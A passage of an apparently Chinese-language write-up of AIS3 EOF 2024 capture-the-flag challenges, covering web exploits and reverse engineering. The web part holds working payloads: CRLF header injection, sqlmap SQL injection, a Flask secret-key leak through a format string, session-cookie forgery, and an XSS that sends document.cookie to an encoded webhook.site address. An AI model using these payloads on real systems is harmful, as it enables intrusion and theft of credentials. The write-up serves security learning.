class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">~&gt;curl -v <span class="string">'http://10.105.0.21:11932/?redir=http://web:7777/flag%0D%0AX-Accel-Redrect:%20/flag'</span></span><br><span class="line">*   Trying 10.105.0.21:11932...</span><br><span class="line">* Connected to 10.105.0.21 (10.105.0.21) port 11932</span><br><span class="line">&gt; GET /?redir=http://web:7777/flag%0D%0AX-Accel-Redirect:%20/flag HTTP/1.1</span><br><span class="line">&gt; Host: 10.105.0.21:11932</span><br><span class="line">&gt; User-Agent: curl/8.4.0</span><br><span class="line">&gt; Accept: */*</span><br><span class="line">&gt; </span><br><span class="line">&lt; HTTP/1.1 200 OK</span><br><span class="line">&lt; Server: nginx/1.25.3</span><br><span class="line">&lt; Date: Fri, 05 Jan 2024 13:38:29 GMT</span><br><span class="line">&lt; Transfer-Encoding: chunked</span><br><span class="line">&lt; Connection: keep-alive</span><br><span class="line">&lt; </span><br><span class="line">* Connection <span class="comment">#0 to host 10.105.0.21 left intact</span></span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3{JUST_s0me_funnY_n91Nx_fEatuRE}</span><br></pre></td></tr></table></figure></div><h3 id="copypasta"><a href="#copypasta" class="headerlink" title="copypasta"></a>copypasta</h3><h4 id="題目-5"><a href="#題目-5" class="headerlink" title="題目"></a>題目</h4><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session, redirect, url_for, send_file, render_template, g</span><br><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = secrets.token_hex(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db</span>():</span><br><span class="line">    db = <span class="built_in">getattr</span>(g, <span class="string">"_database"</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">if</span> db <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        db = g._database = sqlite3.connect(<span class="string">"/tmp/db.sqlite3"</span>)</span><br><span class="line">        db.row_factory = sqlite3.Row</span><br><span class="line">    <span class="keyword">return</span> db</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.teardown_appcontext</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">close_connection</span>(<span class="params">exception</span>):</span><br><span class="line">    db = <span class="built_in">getattr</span>(g, <span class="string">"_database"</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">if</span> db <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        db.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> app.app_context():</span><br><span class="line">    db = sqlite3.connect(<span class="string">"/tmp/db.sqlite3"</span>)</span><br><span class="line">    cursor = db.cursor()</span><br><span class="line">    cursor.executescript(</span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">    CREATE TABLE IF NOT EXISTS copypasta_template (</span></span><br><span class="line"><span class="string">        id TEXT,</span></span><br><span class="line"><span class="string">        title,</span></span><br><span class="line"><span class="string">        template TEXT,</span></span><br><span class="line"><span class="string">        PRIMARY KEY (id)</span></span><br><span class="line"><span class="string">    );</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    )</span><br><span class="line">    cursor.execute(</span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">    CREATE TABLE IF NOT EXISTS copypasta (</span></span><br><span class="line"><span class="string">        id TEXT,</span></span><br><span class="line"><span class="string">        orig_id TEXT,</span></span><br><span class="line"><span class="string">        PRIMARY KEY (id)</span></span><br><span class="line"><span class="string">    );</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    )</span><br><span class="line">    </span><br><span class="line">    cursor.execute( </span><br><span class="line">        <span class="string">"INSERT OR IGNORE INTO copypasta_template (id, title, template) VALUES (?,?,?), (?,?,?), (?,?,?)"</span>,</span><br><span class="line">        (<span class="string">"1"</span>, <span class="string">"求求你們不要再貼疑似..."</span>, <span class="string">"求求你們不要再貼疑似{field[event]}的{field[media]}\n我從{field[when]}的時候就開始{field[action]}\n每當我被生活壓得喘不過氣來的時候\n只要聽到{field[hope]}\n就能找回活下去的希望\n昨天看到了那段{field[media]}\n雖然我知道{field[media]}是{field[who]}的可能性很少 畢竟有那麽多{field[similar]}\n難免會有相似的存在\n但是那個{field[thing]}真的太像了 我一看到就能反應過來\n感覺世界開始逐漸崩塌\n求求你們不要再討論這件事了\n再這樣下去我連唯一支持自己活下去的理由都沒有了"</span>,</span><br><span class="line">         <span class="string">"2"</span>, <span class="string">"宿儺太強了..."</span>, <span class="string">"{field[character]}太強了\n而且{field[character]}還沒有使出全力的樣子\n對方就算沒有{field[object]}也會贏\n我甚至覺得有點對不起他\n我沒能在這場戰鬥讓{field[character]}展現他的全部給我\n殺死我的不是{field[thing1]}或{field[thing2]}\n而是比我更強的傢伙，真是太好了"</span>,</span><br><span class="line">         <span class="string">"3"</span>, <span class="string">"FLAG???"</span>, <span class="string">"The flag is: {field[flag]}"</span>)</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="comment"># add flag</span></span><br><span class="line">    flag_uuid = <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line">    cursor.execute(</span><br><span class="line">        <span class="string">"INSERT OR IGNORE INTO copypasta (id, orig_id) VALUES (?,?)"</span>,</span><br><span class="line">        (flag_uuid, <span class="string">"3"</span>)</span><br><span class="line">    )</span><br><span class="line">    <span class="built_in">open</span>(<span class="string">f'posts/<span class="subst">{flag_uuid}</span>'</span>, <span class="string">'w'</span>).write(</span><br><span class="line">        <span class="string">"The flag is: "</span> + <span class="string">"FLAG{test flag}"</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    db.commit()</span><br><span class="line">    db.close()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">"/"</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">'posts'</span>) <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        session[<span class="string">'posts'</span>] = []</span><br><span class="line">    templates = db().cursor().execute(</span><br><span class="line">        <span class="string">"SELECT * FROM copypasta_template"</span></span><br><span class="line">    ).fetchall()</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">"index.html"</span>, templates=templates)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">"/use"</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>():</span><br><span class="line">    <span class="built_in">id</span> = request.args.get(<span class="string">"id"</span>)</span><br><span class="line">    tmpl = db().cursor().execute(</span><br><span class="line">        <span class="string">f"SELECT * FROM copypasta_template WHERE id = <span class="subst">{<span class="built_in">id</span>}</span>"</span></span><br><span class="line">    ).fetchone()</span><br><span class="line">    content = tmpl[<span class="string">"template"</span>]</span><br><span class="line">    fields = <span class="built_in">dict</span>.fromkeys(re.findall(<span class="string">r"{field\[([^}]+)\]}"</span>, content))</span><br><span class="line">    content = re.sub(<span class="string">r"{field\[([^}]+)\]}"</span>, <span class="string">r"{\1}"</span>, tmpl[<span class="string">"template"</span>])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">"create.html"</span>, content=content, fields=fields, <span class="built_in">id</span>=<span class="built_in">id</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.post(<span class="params"><span class="string">"/use"</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_post</span>():</span><br><span class="line">    <span class="built_in">id</span> = request.args.get(<span class="string">"id"</span>)</span><br><span class="line">    tmpl = db().cursor().execute(</span><br><span class="line">        <span class="string">f"SELECT * FROM copypasta_template WHERE id = <span class="subst">{<span class="built_in">id</span>}</span>"</span></span><br><span class="line">    ).fetchone()</span><br><span class="line">    content = tmpl[<span class="string">"template"</span>]</span><br><span class="line"></span><br><span class="line">    res = content.<span class="built_in">format</span>(field=request.form)</span><br><span class="line">    <span class="built_in">id</span> = <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line">    db().cursor().execute(</span><br><span class="line">        <span class="string">"INSERT INTO copypasta (id, orig_id) VALUES (?, ?)"</span>,</span><br><span class="line">        (<span class="built_in">id</span>, tmpl[<span class="string">"id"</span>])</span><br><span class="line">    )</span><br><span class="line">    db().commit()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f"posts/<span class="subst">{<span class="built_in">id</span>}</span>"</span>, <span class="string">"w"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(res)</span><br><span class="line"></span><br><span class="line">    session[<span class="string">'posts'</span>] = [<span class="built_in">id</span>] + session[<span class="string">'posts'</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">"view"</span>, <span class="built_in">id</span>=<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">"/view/&lt;id&gt;"</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">id</span> <span class="keyword">in</span> session.get(<span class="string">'posts'</span>, []):</span><br><span class="line">        content = <span class="built_in">open</span>(<span class="string">f"posts/<span class="subst">{<span class="built_in">id</span>}</span>"</span>).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        content = <span class="string">"(permission denied)"</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">"view.html"</span>, content=content)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><h5 id="Step1-app-post-use-有-SQLi-可以把-flag-的-uuid-偷出來"><a href="#Step1-app-post-use-有-SQLi-可以把-flag-的-uuid-偷出來" class="headerlink" title="Step1: @app.post(&quot;/use&quot;) 有 SQLi, 可以把 flag 的 uuid 偷出來"></a>Step1: <code>@app.post("/use")</code> 有 SQLi, 可以把 flag 的 <code>uuid</code> 偷出來</h5><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap --level 5 --risk 3 -T copypasta -C id --dump --technique=B --dbms sqlite3 -u 'http://localhost:48763/use?id=3*' --data="flag=flag"</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Database: &lt;current&gt;</span><br><span class="line">Table: copypasta</span><br><span class="line">[7 entries]</span><br><span class="line">+--------------------------------------+</span><br><span class="line">| <span class="built_in">id</span>                                   |</span><br><span class="line">+--------------------------------------+</span><br><span class="line">| 2a7fb2b6-a4e2-4eda-82cb-5f25e5bfa485 |</span><br><span class="line">| 2cc6be38-26e6-4a77-a387-825426c05d04 |</span><br><span class="line">| 38bcdb16-f47f-479f-82f4-ccad7fb4e4c5 |</span><br><span class="line">| 4f7c6bec-2ccd-4f7a-a43c-e479f1b4e4b0 |</span><br><span class="line">| 6b0e91bd-6367-4243-9393-445b2f831b72 |</span><br><span class="line">| 83ad8a59-a6f0-4ecc-bd1d-e9686d6f093a |</span><br><span class="line">| cdcad549-2371-4085-889c-19a2441037c4 |</span><br><span class="line">+--------------------------------------+</span><br></pre></td></tr></table></figure></div><p>在賽中我做到這就先去水其他題的分數了, 剩下的是賽後解的.</p><h5 id="Step2-利用-format-string-偷出-app-secret-key"><a href="#Step2-利用-format-string-偷出-app-secret-key" class="headerlink" title="Step2: 利用 format string 偷出 app.secret_key"></a>Step2: 利用 format string 偷出 <code>app.secret_key</code></h5><p>在  <code>@app.post("/use")</code> 裡面的  <code>content.format(field=request.form)</code> 的 <code>content</code> 跟 <code>request.form</code> 都可控 (SQLi), 所以可以用來偷 <code>app.secret_key</code>. 可以參考 <a class="link" href="https://book.hacktricks.xyz/generic-methodologies-and-resources/python/python-internal-read-gadgets#flask-read-secret-key">https://book.hacktricks.xyz/generic-methodologies-and-resources/python/python-internal-read-gadgets#flask-read-secret-key <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> , <a class="link" href="https://book.hacktricks.xyz/generic-methodologies-and-resources/python/python-internal-read-gadgets">https://book.hacktricks.xyz/generic-methodologies-and-resources/python/python-internal-read-gadgets <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> .</p><p>最後我構造出的 payload 如下, 可以確實偷到 <code>app.secret_key</code>.</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Initialize the session to make `session['posts'] != None` to prevent 500</span></span><br><span class="line">s.get(URL)</span><br><span class="line"></span><br><span class="line"><span class="comment"># To get the secret key</span></span><br><span class="line"><span class="comment"># https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes#python-format-string</span></span><br><span class="line">r = s.post(<span class="string">f'''<span class="subst">{URL}</span>/use?id=<span class="subst">{payload.<span class="built_in">format</span>(<span class="string">"_______{field.__init__.__globals__[__loader__].__init__.__globals__[sys].modules[app].app.secret_key}______"</span>)}</span>'''</span>, data={</span><br><span class="line">    <span class="string">'flag'</span>: <span class="string">'fllll'</span></span><br><span class="line">})</span><br><span class="line"><span class="built_in">print</span>(html.unescape(r.text))</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_______c6023e3227c2300ac39a2a23ea9568af______</span><br></pre></td></tr></table></figure></div><h5 id="Step3-利用-flask-secret-偽造-flask-session"><a href="#Step3-利用-flask-secret-偽造-flask-session" class="headerlink" title="Step3. 利用 flask secret 偽造 flask session"></a>Step3. 利用 flask secret 偽造 flask session</h5><p><a class="link" href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/flask">https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/flask <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><code>flask-unsign</code> 這個工具可以用.</p><div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flask-unsign --sign --secret c6023e3227c2300ac39a2a23ea9568af --cookie <span class="string">"{'posts': ['2a7fb2b6-a4e2-4eda-82cb-5f25e5bfa485']}"</span></span><br><span class="line">eyJwb3N0cyI6WyIyYTdmYjJiNi1hNGUyLTRlZGEtODJjYi01ZjI1ZTViZmE0ODUiXX0.ZZ_ELw.CUOF8jlAeKC-kb9Xf3qL50oaP0U</span><br></pre></td></tr></table></figure></div><h5 id="Step4-換上生出來的-cookie-訪問-view-取得-flag"><a href="#Step4-換上生出來的-cookie-訪問-view-取得-flag" class="headerlink" title="Step4. 換上生出來的 cookie, 訪問 /view/<uuid> 取得 flag"></a>Step4. 換上生出來的 cookie, 訪問 <code>/view/&lt;uuid&gt;</code> 取得 flag</h5><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3{1_L0Ve_PaSt@_aNd_c0Pypast@}</span><br></pre></td></tr></table></figure></div><h3 id="HTML-Debugger"><a href="#HTML-Debugger" class="headerlink" title="HTML Debugger"></a>HTML Debugger</h3><p>這題是賽後解的, 利用到的特性是 pupteer 在點擊指定的 element 的時候, 其實會先取得他的座標, 再去點擊那個座標, 所以如果在那上面有其他元素, 就會點到那個元素, 所以把可以 XSS 利用的按鈕用 style (因為有 Dompurify 所以能插入的東西有限) 放到最大最高的地方讓 pupteer 誤點, 再串 Dom Clobbering 來觸發 XSS 的點就拿的到 flag 了.</p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">padding to preserve style tag......</span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-id">#form</span> { <span class="attribute">display</span>: block <span class="meta">!important</span>; }</span></span><br><span class="line"><span class="language-css"><span class="selector-id">#preview_btn</span> {</span></span><br><span class="line"><span class="language-css">    <span class="attribute">display</span>: block <span class="meta">!important</span> ;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">z-index</span>: <span class="number">100</span> <span class="meta">!important</span> ;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">position</span>: fixed <span class="meta">!important</span> ;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">width</span>: <span class="number">100%</span> <span class="meta">!important</span> ;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">height</span>: <span class="number">100%</span> <span class="meta">!important</span> ;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">left</span>: <span class="number">0%</span> <span class="meta">!important</span> ;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">top</span>: <span class="number">0%</span> <span class="meta">!important</span> ;</span></span><br><span class="line"><span class="language-css">}</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">"html_text"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">"res"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- Use cid protocol to prevent our tag being url encoded, use atob to prevent ? from appearing, since it would cause the thing following it to be url encoded too.--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"cid:&lt;img src=x onerror=location=atob('aHR0cHM6Ly93ZWJob29rLnNpdGUvZGRiZDBkN2EtODQ5NC00ZGJlLWI3NjYtZWVjYjhiMDUwOTFiPw==')+document.cookie;&gt;"</span> <span class="attr">id</span>=<span class="string">"res"</span> <span class="attr">name</span>=<span class="string">"text"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3{CHIP1_Ch1p1_cHap@_cHaP@_DUBi_DUbi_da8a_d4B@}</span><br></pre></td></tr></table></figure></div><h2 id="Rev"><a href="#Rev" class="headerlink" title="Rev"></a>Rev</h2><h3 id="Flag-Generator"><a href="#Flag-Generator" class="headerlink" title="Flag Generator"></a>Flag Generator</h3><p>進來看到題目是對 <code>Block</code> 進行一連串的操作之後把結果放到 <code>writeFile</code> 裏面，跟進裏面看看。</p><p><img src="/ais3-eof-2024-write-up/flag-generator.png" alt="flag generator"></p><p>發現 <code>writeFile</code> 根本沒有寫檔，來動態執行把 <code>Block</code> 拉出來看看，先下一個斷點在這裏。</p><p><img src="/ais3-eof-2024-write-up/image-20240109110505699.png" alt="image-20240109110505699"></p><p><img src="/ais3-eof-2024-write-up/image-20240109111240619.png" alt="image-20240109111240619"></p><p>接著進入 <code>Block</code> 的地方，發現是個執行檔，拉出來看看。</p><p><img src="/ais3-eof-2024-write-up/image-20240109111304073.png" alt="image-20240109111304073"></p><p>直接執行起來就有 flag 了。</p><p><img src="/ais3-eof-2024-write-up/image-20240109111627758.png" alt="image-20240109111627758"></p><h3 id="stateful"><a href="#stateful" class="headerlink" title="stateful"></a>stateful</h3><p>進來看到是一個經典的 flag checker，將使用者的輸入經過 <code>state_machine</code> 之後與 <code>k_target</code> 進行比較是否一致，如果一致就會說是 correct。跟進 <code>state_machine</code> 看看。</p><p><img src="/ais3-eof-2024-write-up/stateful.png" alt="stateful"></p><h4 id="state-machine"><a href="#state-machine" class="headerlink" title="state_machine"></a><code>state_machine</code></h4><p>進來看到是一個 state machine，跟進 <code>state_4260333374</code> 看看。</p><p><img src="/ais3-eof-2024-write-up/state-machine.png" alt="state machine"></p><h4 id="state-4260333374"><a href="#state-4260333374" class="headerlink" title="state_4260333374"></a><code>state_4260333374</code></h4><p>進來看到是對我們的輸入進行操作，到其他的 state function 裏面去看也都是類似的操作。所以我們要做的是模擬 state machine 來解出 flag。</p><p><img src="/ais3-eof-2024-write-up/image-20240109104544875.png" alt="image-20240109104544875"></p><h4 id="模擬-state-machine"><a href="#模擬-state-machine" class="headerlink" title="模擬 state machine"></a>模擬 state machine</h4><p>將 IDA decompiled 的 code 複製出來到 VSCode，利用 find and replace 將呼叫 function 的部分替換成 <code>cout</code>，再去執行就會有 state function 的呼叫順序。</p><p><img src="/ais3-eof-2024-write-up/image-20240109104854992.png" alt="image-20240109104854992"></p><p>BTW，我 find and replace 用的像是這樣。</p><p><img src="/ais3-eof-2024-write-up/image-20240109105546793.webp" alt=" "></p><p>有呼叫順序后，再將對應 state function 所作的事情寫出來，大概會像這樣：</p><p><img src="/ais3-eof-2024-write-up/image-20240109105716736.png" alt="image-20240109105716736"></p><p>接著把前面的 <code>k_target</code> 拉出來，再用 z3 來解出原本的 flag。</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">k_target = <span class="built_in">bytes</span>.fromhex(<span class="string">'F51ACC330216F4566B4265755F87F1A11BAD2A90FA716C122B525F2D37405B0880335373E33A74A033CC7D'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> IPython <span class="keyword">import</span> embed</span><br><span class="line"></span><br><span class="line"><span class="comment"># https://lebr0nli.github.io/blog/security/Z3-Theorem-Prover/</span></span><br><span class="line">flag = [BitVec(<span class="string">f"f_<span class="subst">{i}</span>"</span>, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(k_target))]</span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(<span class="string">b"AIS3{"</span>):</span><br><span class="line">    s.add(flag[i] == c)</span><br><span class="line">s.add(flag[-<span class="number">1</span>] == <span class="built_in">ord</span>(<span class="string">"}"</span>))</span><br><span class="line"></span><br><span class="line">flag_init = flag.copy()</span><br><span class="line"></span><br><span class="line">flag[<span class="number">14</span>] += flag[<span class="number">35</span>] + flag[<span class="number">8</span>]</span><br><span class="line">flag[<span class="number">9</span>] -= flag[<span class="number">2</span>] + flag[<span class="number">22</span>]</span><br><span class="line">flag[<span class="number">0</span>] -= flag[<span class="number">18</span>] + flag[<span class="number">31</span>]</span><br><span class="line">flag[<span class="number">2</span>] += flag[<span class="number">11</span>] + flag[<span class="number">8</span>]</span><br><span class="line">flag[<span class="number">6</span>] += flag[<span class="number">10</span>] + flag[<span class="number">41</span>]</span><br><span class="line">flag[<span class="number">14</span>] -= flag[<span class="number">32</span>] + flag[<span class="number">6</span>]</span><br><span class="line">flag[<span class="number">16</span>] += flag[<span class="number">25</span>] + flag[<span class="number">11</span>]</span><br><span class="line">flag[<span class="number">31</span>] += flag[<span class="number">34</span>] + flag[<span class="number">16</span>]</span><br><span class="line">flag[<span class="number">9</span>] += flag[<span class="number">11</span>] + flag[<span class="number">3</span>]</span><br><span class="line">flag[<span class="number">17</span>] += flag[<span class="number">0</span>] + flag[<span class="number">7</span>]</span><br><span class="line">flag[<span class="number">5</span>] += flag[<span class="number">40</span>] + flag[<span class="number">4</span>]</span><br><span class="line">flag[<span class="number">37</span>] -= flag[<span class="number">29</span>] + flag[<span class="number">3</span>]</span><br><span class="line">flag[<span class="number">23</span>] += flag[<span class="number">7</span>] + flag[<span class="number">34</span>]</span><br><span class="line">flag[<span class="number">39</span>] -= flag[<span class="number">25</span>] + flag[<span class="number">38</span>]</span><br><span class="line">flag[<span class="number">27</span>] += flag[<span class="number">18</span>] + 